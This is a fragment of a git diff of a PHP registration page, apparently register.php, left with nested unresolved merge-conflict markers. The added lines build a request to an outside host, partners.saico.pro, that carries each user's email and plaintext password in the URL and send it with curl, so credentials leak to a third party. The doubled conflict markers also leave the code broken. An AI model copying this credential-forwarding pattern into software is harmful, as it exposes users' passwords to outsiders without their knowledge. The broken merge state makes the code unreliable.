@@ -61,8 +61,19 @@ header('Refresh: 3; url=login.php');
 
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 								header("Content-Type: text/html; charset=UTF-8");
 								header('Refresh: 3; url=/login.php');
+=======
+							$url = "https://partners.saico.pro/nrfpp?name=&email=".$email."&password=".$pass."&referer=".$ref;
+								$curl = curl_init();
+								curl_setopt($curl, CURLOPT_URL, $url);
+								curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+								curl_setopt($curl, CURLOPT_HEADER, false);
+								$data = curl_exec($curl);
+								curl_close($curl);
+
+>>>>>>> parent of 6ab5a1b... Update register.php
 
 
 >>>>>>> parent of 6ab5a1b... Update register.php
